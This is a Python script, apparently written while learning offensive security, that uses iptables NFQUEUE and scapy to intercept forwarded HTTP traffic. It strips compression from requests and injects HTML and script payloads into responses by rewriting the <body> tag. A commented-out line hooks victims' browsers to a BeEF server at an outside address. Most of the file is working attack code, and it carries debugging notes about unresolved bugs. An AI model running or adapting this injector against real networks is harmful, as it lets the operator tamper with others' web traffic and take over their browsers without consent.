#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
import re
import zlib
import linecache

# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number

def PrintException(*args):
	exc_type, exc_obj, tb = sys.exc_info()
	f = tb.tb_frame
	lineno = tb.tb_lineno
	filename = f.f_code.co_filename
	linecache.checkcache(filename)
	line = linecache.getline(filename, lineno, f.f_globals)
	if args:
		print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ problem here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
		print(args)
	print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


def run():
	subprocess.call(["clear"])
	set_iptables()
	create_queue()
	 

def create_queue():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(1, intercept_packets)
	try:
		queue.run()
	except KeyboardInterrupt:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)


def set_iptables():
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def reset_iptables():
	subprocess.call(["iptables", "--flush"])
	pass

def intercept_packets(packet):
	#pkt = scapy.raw(packet)
	#print(pkt)
	''' captures packet and processes it '''
	try:
		target_host = "tachibanalaboratories"
		alert_message = "you have been pwned"
		payload = "<body><script>alert(\'you have been pwned\');</script>"

		scapy_packet = scapy.IP(packet.get_payload())

		if (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(http.HTTPRequest)):
		   # print(scapy_packet.show())
			if scapy_packet[scapy.TCP].dport == 80:
				#print("payload", scapy.raw(scapy_packet[scapy.IP].payload))
				new_packet = set_http_request_header(scapy_packet)
				packet_fragment_list = scapy.fragment(new_packet)
				forward_packet(packet_fragment_list, packet)
				#packet.set_payload(str(new_packet))
				
				#print("request encoding", new_packet[http.HTTPRequest].Accept_Encoding)

		elif (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(http.HTTPResponse)):
			#print("response original length", scapy_packet[http.HTTPResponse].Content_Length)
			load = scapy_packet[scapy.Raw].load
			#print(type(scapy_packet))
			if ((scapy_packet[scapy.TCP].sport == 80) and (scapy_packet is not None) and (load is not None)):
				new_packet = set_response_headers_and_load(scapy_packet, load, payload) # SOMETHING GOING WRONG HERE CAUSING NONETYPE
				if (not new_packet):
					print "PACKET HAS NONE TYPE"
					print new_packet
				packet_fragment_list = scapy.fragment(new_packet) # 'NoneType' object is not iterable
				forward_packet(packet_fragment_list, packet)
				#packet.set_payload(str(new_packet))
				#new_packet[scapy.IP].show()
				#print("response modified length", new_packet[http.HTTPResponse].Content_Length)
				#print("pwn")
		else:
			packet.accept()
	except:
		PrintException()
	
	#packet.accept()

def forward_packet(fragment_list, packet):
	for index, packet_fragment in enumerate(fragment_list):
		print("fragment", index, "##############################################")
		#packet_fragment.show() # useful
		packet.set_payload(str(packet_fragment))
		scapy.send(packet_fragment)
	packet.drop()
		#packet.send()
'''
#### REQUIRED FOR SOME VERSIONS OF SCAPY ####
def get_raw_response_content_length(load):
	content_length_re = re.search("(?:Content-Length:\s)(\d*)", load)
	if content_length_re:
		content_length  = content_length_re(1)
		return content_length

def set_raw_response_content_length(load, payload):
	payload_length = len(payload)
	content_length = get_response_content_length(load)
	try:
		if content_length:
			new_content_length = payload_length + content_length
			load.replace(content_length, new_content_length)
			return load
	except AttributeError:
		print("something has resulted in a None type")
		print(" payload length: ", payload_length)
		print("content length: ", content_length)

#############################################
'''

## trying to figure out a way to recompress the raw layer before forwarding it on to the target but mode -1 is wrong
## need to get this working to avoid the need to fragment packets
def gzip_load(load):
	return zlib.compress(load)


def set_response_header_value_content_length(packet, payload):
	try:
		payload_length  = len(payload)
		content_length =  packet[http.HTTPResponse].Content_Length

		if content_length is not None:
			
			new_content_length = int(content_length) + payload_length # int() argument must be a string or a number, not 'NoneType'
			del packet[http.HTTPResponse].Content_Length
			packet[http.HTTPResponse].Content_Length = new_content_length
		else:
			new_content_length = payload_length
			packet[http.HTTPResponse].Content_Length = new_content_length
		packet.show()
	except:
		PrintException()
	return packet


def set_response_headers_and_load(packet, load, payload):
	#### ISSUE NOT BECAUSE packet None at this point
	if (packet is None):
			print('OOOOOOOOOOOOOOOOOOOOOOOOOOO NONE TYPE PACKET OOOOOOOOOOOOOOOOOOOOOOOOOOO')
			print(packet)
	try:
		#compressed_load = gzip_load(load)
		#load = set_response_content_length(load, payload)
		#payload = "<body>look at you stacy, pathetic creature of flesh and bone, panting and sweating as you run through chad's corridors<script src=\"http://192.168.1.103:3000/hook.js\"></script>" #hooks target browser to BeEF
		payload = "<body>you have been pwned"
		packet = set_response_header_value_content_length(packet, payload)
		if (packet is None):
			print('OOOOOOOOOOOOOOOOOOOOOOOO NONE TYPE PACKET AFTER SET RESPONSE HEADER OOOOOOOOOOOOOOOOOOOOOOOO')
			print(packet)
		#inject payload into raw layer
		#print("Initial load", load)
		#print("payload", payload)
		if load is None:
			print('LOAD IS NONE')
		new_load = load.replace("<body>", payload)
		#print(type(load))
		#print("Final load", new_load)
		packet[scapy.Raw].load = new_load # 'NoneType' object has no attribute '__getitem__'
		if (packet is None):
			print('OOOOOOOOOOOOOOOOOOOOOOOOOOO NONE TYPE PACKET AFTER RAW LAYER LOAD OOOOOOOOOOOOOOOOOOOOOOOOOOO')
			print(packet)
		#print ("Raw load", packet[scapy.Raw].load)
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum

	except:
		#print("Payload type:", type(payload), "payload", payload)
		#print("packet type:", type(packet), "packet", packet)
		PrintException()

	if packet is None:
			print('000000000000000000000000000 ISSUE WITH DELETIONS OF ATTRIBUTES 000000000000000000000000000000')
	else:
		return packet

def set_http_request_header(packet):
	packet[http.HTTPRequest].Accept_Encoding = ""
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
run()
